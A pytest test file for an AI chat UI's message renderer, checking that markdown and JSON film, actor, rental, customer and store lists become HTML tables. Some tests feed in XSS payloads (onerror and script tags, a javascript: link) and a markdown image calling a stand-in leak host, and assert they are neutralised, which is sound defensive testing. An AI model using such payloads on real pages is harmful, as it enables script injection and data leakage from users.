import pytest
from ui_routes import render_ai_message


class TestRenderAiMessage:
    def test_plain_markdown_rendered(self):
        result = render_ai_message("**Bold** text")
        assert "<strong>Bold</strong>" in result

    def test_film_list_json_block_becomes_table(self):
        text = (
            'Here are some films:\n\n'
            '```json\n'
            '{"type":"film_list","items":['
            '{"title":"Alien","rating":"R","rental_rate":4.99,"length":117},'
            '{"title":"Blade Runner","rating":"R","rental_rate":2.99,"length":117}'
            ']}\n'
            '```'
        )
        result = render_ai_message(text)
        assert "<table" in result
        assert "Alien" in result
        assert "Blade Runner" in result
        assert "```json" not in result

    def test_actor_list_json_block_becomes_table(self):
        text = (
            '```json\n'
            '{"type":"actor_list","items":['
            '{"first_name":"Penelope","last_name":"Guiness","film_count":19}'
            ']}\n'
            '```'
        )
        result = render_ai_message(text)
        assert "<table" in result
        assert "Penelope" in result

    def test_rental_list_json_block_becomes_table(self):
        text = (
            '```json\n'
            '{"type":"rental_list","items":['
            '{"title":"Alien","rental_date":"2024-01-01","return_date":"2024-01-08","is_outstanding":false}'
            ']}\n'
            '```'
        )
        result = render_ai_message(text)
        assert "<table" in result
        assert "Alien" in result

    def test_customer_list_json_block_becomes_table(self):
        text = (
            '```json\n'
            '{"type":"customer_list","items":['
            '{"first_name":"Mary","last_name":"Smith","email":"mary@example.com","store_id":1}'
            ']}\n'
            '```'
        )
        result = render_ai_message(text)
        assert "<table" in result
        assert "Mary" in result

    def test_store_list_json_block_becomes_table(self):
        text = (
            '```json\n'
            '{"type":"store_list","items":['
            '{"store_id":1,"city":"Lethbridge","manager":"Mike Hillyer","film_count":100}'
            ']}\n'
            '```'
        )
        result = render_ai_message(text)
        assert "<table" in result
        assert "Lethbridge" in result

    def test_invalid_json_block_passthrough(self):
        text = "```json\n{not valid json}\n```"
        result = render_ai_message(text)
        assert "{not valid json}" in result

    def test_unknown_type_passthrough(self):
        text = '```json\n{"type":"unknown","items":[]}\n```'
        result = render_ai_message(text)
        assert "```json" not in result  # mistune renders it as <code> block

    def test_raw_html_is_escaped(self):
        result = render_ai_message('<img src=x onerror="alert(1)"> and <script>alert(2)</script>')
        assert "<img" not in result
        assert "<script" not in result
        assert "&lt;img" in result

    def test_markdown_image_shows_alt_text_only(self):
        result = render_ai_message("![a <b>cat</b>](https://evil.example/leak?q=secret)")
        assert "<img" not in result
        assert "evil.example" not in result
        assert "cat" in result
        assert "<b>" not in result

    def test_javascript_link_not_rendered_as_href(self):
        result = render_ai_message("[click](javascript:alert(1))")
        assert 'href="javascript:' not in result

    def test_table_cells_are_escaped(self):
        text = (
            '```json\n'
            '{"type":"film_list","items":['
            '{"title":"<img src=x onerror=alert(1)>","rating":"R","rental_rate":1,"length":9}'
            ']}\n'
            '```'
        )
        result = render_ai_message(text)
        assert "<table" in result
        assert "<img" not in result
        assert "&lt;img" in result

    def test_non_dict_items_do_not_break_rendering(self):
        text = '```json\n{"type":"film_list","items":["x", 3]}\n```'
        result = render_ai_message(text)
        assert "<script" not in result

    def test_mixed_text_and_table(self):
        text = (
            'Here are results:\n\n'
            '```json\n'
            '{"type":"film_list","items":['
            '{"title":"Alien","rating":"R","rental_rate":4.99,"length":117}'
            ']}\n'
            '```\n\n'
            'Hope that helps!'
        )
        result = render_ai_message(text)
        assert "<table" in result
        assert "Hope that helps" in result


class TestMessageListTemplate:
    def _render(self, messages):
        from ui_routes import templates
        return templates.get_template("partials/message_list.html").render(
            messages=messages, render_ai_message=render_ai_message
        )

    def test_assistant_message_is_rendered(self):
        html_out = self._render([{"role": "assistant", "content": "**hi**"}])
        assert "<strong>hi</strong>" in html_out

    def test_tool_badge_shows_tool_name_not_output(self):
        html_out = self._render([{"role": "tool", "content": "HUGE OUTPUT", "tool_name": "search_films"}])
        assert "search_films" in html_out
        assert "HUGE OUTPUT" not in html_out

    def test_user_message_is_autoescaped(self):
        html_out = self._render([{"role": "user", "content": "<script>x</script>"}])
        assert "<script>x" not in html_out
